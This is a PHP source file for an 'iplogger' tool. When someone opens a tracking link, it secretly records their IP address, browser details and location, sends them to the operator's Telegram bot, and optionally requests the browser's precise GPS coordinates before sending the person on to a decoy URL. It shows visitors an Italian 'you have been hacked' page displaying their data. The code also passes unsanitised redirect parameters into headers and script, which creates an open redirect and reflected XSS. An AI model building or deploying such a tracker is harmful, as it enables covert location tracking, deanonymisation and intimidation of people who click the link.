<?php


/*
    iplogger - receive on telegram the ip info and the location of the user who clicked the link
    Copyright (C) 2018  91DarioDev github.com/91DarioDev

    iplogger is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published
    by the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    iplogger is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with iplogger.  If not, see <http://www.gnu.org/licenses/>.
*/


require('telegramapi.php');
require('config.php');
require('ipapi.php');
require('tinyurlapi.php');
require('browsers_ignore.php');


if (isset($_GET['redir']) && empty($_GET['geox']) ) header('Location: '.$_GET['redir']);

$ip = $_SERVER['REMOTE_ADDR'];
$lid = $_GET['id'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$accept=$_SERVER['HTTP_ACCEPT_LANGUAGE'];
$today = date("l, F j, Y, g:i a") ;
$script_url = $_SERVER['SCRIPT_URI'];
$tinyurl = get_timed_link($script_url);

$message = "
Ip: $ip
Browser: $userAgent
Lingua: $accept
Giorno & Ora : $today
Url: $script_url
TinyUrl: $tinyurl
ID : $lid
";

$res = get_ip_info($ip);

if ($res !== null){
	$message .= "\n<b>Info ip:</b>\n";
	foreach($res as $key => $value){  
		$message .= $key.": ".$value."\n";  
	}
}
$message .= "source code: https://github.com/91DarioDev/iplogger";
// ignore bots click
if (!in_array($_SERVER['HTTP_USER_AGENT'], $BROWSERS_TO_IGNORE)) {
  $first_message = sendMessage($bot_admin_id, $message);

  if ($res !== null){
      sendLocation(
          $bot_admin_id, 
          (float)$res['lat'], 
          (float)$res['lon'],
          null,
          false,
          (int)$first_message['result']['message_id']
      );
  }
}


if ( $_GET['geox'] == 'true') {
	if (isset($_GET['redir']) ){
      if (in_array($_SERVER['HTTP_USER_AGENT'], $BROWSERS_TO_IGNORE)) {
      	header('Location: '.$_GET['redir']);
      }
      echo '<html>
          <head>
              <script>
                (function getLocation() {
                    if (navigator.geolocation) {
                      navigator.geolocation.getCurrentPosition(function(position){
                        var lat = position.coords.latitude;
                        var lon = position.coords.longitude;
                        window.location="geo.php?lat="+lat+"&lon="+lon+"&mid='.$first_message['result']['message_id'].'"+"&redir='.$_GET['redir'].'";                
                      }, function(err){
                          window.location="'.$_GET['redir'].'";
                      });
                    } else {
                      window.location="'.$_GET['redir'].'";
                    }
                })();
              </script>
          </head>
          <body>
          </body>
          <html>';
    } else {
		echo '<html>
          <head>
              <script>
                (function getLocation() {
                    if (navigator.geolocation) {
                      navigator.geolocation.getCurrentPosition(function(position){
                        var lat = position.coords.latitude;
                        var lon = position.coords.longitude;
                        window.location="geo.php?lat="+lat+"&lon="+lon+"&mid='.$first_message['result']['message_id'].'";                
                      }, function(err){
                        document.body.innerHTML = `
                        <div align="center" style="background-color:black">
                        <font color="lightgreen" size="6">
                        <h1>SEI STATO HACKERATO: </h1>
                        <hr width="50%" />
                        <h2>ecco i tuoi dati: </h2>
                        '.nl2br($message).'
                        <hr width="50%"/>
                        <h3>Inviaci un commento</h3>
                        <form action="comment.php" method="get"> 
                            Nome: <input type="text" name="nome" /><br />
                            Commento: <textarea name="commento"></textarea><br />
                            <input type="submit" name="invia" value="invia" /><br />
                        </form>
                        </font>
                        </div>
                                `;
                      })
                    }else {
                        document.body.innerHTML = `
                        <div align="center" style="background-color:black">
                        <font color="lightgreen" size="6">
                        <h1>SEI STATO HACKERATO: </h1>
                        <hr width="50%" />
                        <h2>ecco i tuoi dati: </h2>
                        '.nl2br($message).'
                        <hr width="50%"/>
                        <h3>Inviaci un commento</h3>
                        <form action="comment.php" method="get"> 
                            Nome: <input type="text" name="nome" /><br />
                            Commento: <textarea name="commento"></textarea><br />
                            <input type="submit" name="invia" value="invia" /><br />
                        </form>
                        </font>
                        </div>
                               `;
                    }
                })();
                </script>
            </head>
            <body>
            </body>
            <html>';
    }
} else {
	echo '<html>
  <head>
  	<title></title>
  </head>
  <body>
  	<div align="center" style="background-color:black">
  	<font color="lightgreen" size="6">
  	<h1>SEI STATO HACKERATO: </h1>
    <hr width="50%" />
    <h2>ecco i tuoi dati: </h2>
    '.nl2br($message).'
    <hr width="50%"/>
    <h3>Inviaci un commento</h3>
    <form action="comment.php" method="get"> 
    	Nome: <input type="text" name="nome" /><br />
        Commento: <textarea name="commento"></textarea><br />
        <input type="submit" name="invia" value="invia" /><br />
    </form>
    </font>
    </div>
  </body>
</html>';
}
?>



